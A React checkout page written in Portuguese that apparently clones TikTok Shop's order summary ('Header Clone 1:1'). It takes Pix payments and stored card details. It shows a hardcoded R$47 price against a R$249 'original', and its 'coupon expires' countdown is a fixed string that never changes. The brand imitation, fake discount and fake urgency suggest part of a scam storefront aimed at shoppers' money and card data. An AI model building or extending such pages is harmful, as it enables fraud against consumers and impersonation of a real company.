"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  ShieldCheck, 
  Star, 
  Zap, 
  CheckCircle2, 
  ChevronUp,
  Plus,
  Minus,
  Ticket,
  CreditCard
} from 'lucide-react';
import { Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import PaymentMethodDrawer from '@/components/PaymentMethodDrawer';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [isPaymentDrawerOpen, setIsPaymentDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(1);
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    } else if (!location.state?.cardAdded) {
      navigate('/');
    }

    if (location.state?.cardAdded && location.state?.cardData) {
      setCardData(location.state.cardData);
      setPaymentMethod('card');
    }
  }, [location, navigate]);

  if (!product) return null;

  const unitPrice = 47.00;
  const originalUnitPrice = 249.00;
  const subtotal = unitPrice * quantity;
  const originalSubtotal = originalUnitPrice * quantity;
  const discountTotal = originalSubtotal - subtotal;
  const finalTotal = subtotal - couponAmount;
  const finalTotalStr = finalTotal.toFixed(2).replace('.', ',');

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[130px]">
      {/* Header Clone 1:1 */}
      <div className="bg-white border-b h-14 flex flex-col items-center justify-center sticky top-0 z-50 px-4">
        <div className="w-full flex items-center relative">
          <button onClick={() => navigate(-1)} className="absolute left-0">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <div className="w-full text-center">
            <h1 className="text-[17px] font-bold text-gray-900">Resumo do Pedido</h1>
            <div className="flex items-center justify-center text-[#00BFA5] text-[10px] mt-0.5">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="mr-1"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
              <span>Planos sem juros disponíveis</span>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto">
        {/* Endereço Simplificado */}
        <div className="bg-white p-4 flex items-center justify-between border-b border-gray-100">
          <div className="flex items-center space-x-2">
            <MapPin size={18} className="text-gray-900" />
            <span className="text-[14px] text-gray-900 font-medium">Endereço de envio</span>
          </div>
          <button className="text-[#FF2C55] text-[14px] font-medium" onClick={() => navigate('/adicionar-endereco')}>
            + Adicionar endereço
          </button>
        </div>

        {/* Cupom TikTok Shop */}
        <div 
          className="bg-white mt-3 p-4 flex items-center justify-between cursor-pointer"
          onClick={() => setIsCouponDrawerOpen(true)}
        >
          <div className="flex items-center space-x-2">
            <Ticket size={20} className="text-[#FF2C55] rotate-[-10deg]" />
            <span className="text-[14px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-1">
            <span className="text-[12px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-2 py-0.5 rounded-sm">
              - R$ {couponAmount.toFixed(2).replace('.', ',')}
            </span>
            <ChevronRight size={16} className="text-gray-300" />
          </div>
        </div>

        {/* Resumo de Preços */}
        <div className="bg-white mt-3 p-4">
          <div className="space-y-3.5">
            <div className="flex justify-between items-center">
              <div className="flex items-center space-x-1.5">
                <span className="text-[14px] text-gray-900 font-bold">Subtotal do produto</span>
                <ChevronUp size={16} className="text-gray-900" />
              </div>
              <span className="text-[14px] font-bold text-gray-900">R$ {subtotal.toFixed(2).replace('.', ',')}</span>
            </div>
            <div className="pt-2 border-t flex flex-col items-end">
              <div className="flex items-center space-x-4 w-full justify-between mt-1">
                <span className="text-[16px] font-bold text-gray-900 uppercase">Total</span>
                <span className="text-[16px] font-bold text-gray-900">R$ {finalTotalStr}</span>
              </div>
              <span className="text-[11px] text-gray-400 mt-0.5">Impostos inclusos</span>
            </div>
          </div>
        </div>

        {/* Forma de Pagamento */}
        <div className="bg-white mt-3 p-4">
          <h3 className="text-[14px] font-bold text-gray-900 mb-5">Forma de pagamento</h3>
          
          <div className="space-y-6">
            {cardData ? (
              // Exibição do Cartão Salvo (Simulado)
              <div className="flex items-center justify-between cursor-pointer" onClick={() => setPaymentMethod('card')}>
                <div className="flex items-center space-x-3">
                  <div className="bg-gray-100 p-1.5 rounded-sm border">
                    <CreditCard size={18} className="text-gray-600" />
                  </div>
                  <div className="flex flex-col">
                    <span className="text-[14px] text-gray-900 font-medium">
                      Cartão final {cardData.last4}
                    </span>
                    <span className="text-[11px] text-gray-400 uppercase">{cardData.brand}</span>
                  </div>
                </div>
                <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'card' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
                  {paymentMethod === 'card' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full"></div>}
                </div>
              </div>
            ) : (
              // Botão Adicionar Cartão
              <div className="flex items-start justify-between cursor-pointer" onClick={() => navigate('/adicionar-cartao')}>
                <div className="flex items-start space-x-3">
                  <div className="bg-gray-100 p-1 rounded-sm"><Plus size={14} className="text-gray-400" /></div>
                  <div className="flex flex-col">
                    <span className="text-[14px] text-gray-900 font-medium">Cartão de crédito</span>
                    <div className="flex gap-2 mt-2">
                      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="Mastercard" />
                      <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-4" alt="Visa" />
                    </div>
                  </div>
                </div>
                <ChevronRight size={18} className="text-gray-300 mt-1" />
              </div>
            )}

            <div className="flex items-center justify-between cursor-pointer" onClick={() => setPaymentMethod('pix')}>
              <div className="flex items-center space-x-3">
                <div className="bg-[#EFFFFD] p-1 rounded-sm">
                  <img src="https://logospng.org/download/pix/logo-pix-icone-512.png" className="h-4 w-4" alt="Pix" />
                </div>
                <span className="text-[14px] text-gray-900 font-medium">Pix</span>
              </div>
              <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${paymentMethod === 'pix' ? 'border-[#FF2C55]' : 'border-gray-200'}`}>
                {paymentMethod === 'pix' && <div className="w-2.5 h-2.5 bg-[#FF2C55] rounded-full"></div>}
              </div>
            </div>

            <div className="flex items-center justify-between border-t pt-4" onClick={() => setIsPaymentDrawerOpen(true)}>
              <img src="https://images.seeklogo.com/logo-png/32/1/google-pay-logo-png_seeklogo-324563.png" className="h-4" alt="GPay" />
              <button className="flex items-center text-[13px] font-bold text-gray-900">
                Ver todos <ChevronRight size={16} className="ml-1" />
              </button>
            </div>
          </div>
        </div>

        {/* Faixa de Economia */}
        <div className="bg-[#FFF1F3] p-3 flex items-center space-x-2 mt-2 mb-4">
          <span className="text-[16px]">😊</span>
          <span className="text-[12px] text-[#FF2C55] font-medium">
            Você está economizando R$ {(discountTotal + couponAmount).toFixed(2).replace('.', ',')} nesse pedido.
          </span>
        </div>
      </div>

      {/* Footer Fixo */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-2 px-1">
            <span className="text-[15px] font-bold text-gray-900">Total (1 item)</span>
            <span className="text-[18px] font-bold text-[#FF2C55]">R$ {finalTotalStr}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[52px] flex flex-col items-center justify-center"
            onClick={() => {
              if (paymentMethod === 'pix') {
                navigate('/pix-pagamento', { state: { product } });
              } else {
                // Aqui você redirecionaria para o fluxo de cartão aprovado
                window.location.href = '/checkout.html';
              }
            }}
          >
            <span className="text-[16px]">Fazer pedido</span>
            <span className="text-[11px] font-medium mt-0.5">O cupom expira em 02:43:46</span>
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
      <PaymentMethodDrawer 
        isOpen={isPaymentDrawerOpen} 
        onClose={() => setIsPaymentDrawerOpen(false)} 
        onSelectMethod={setPaymentMethod} 
        onAddCard={() => navigate('/adicionar-cartao')}
        total={finalTotalStr}
      />
    </div>
  );
};

export default Checkout;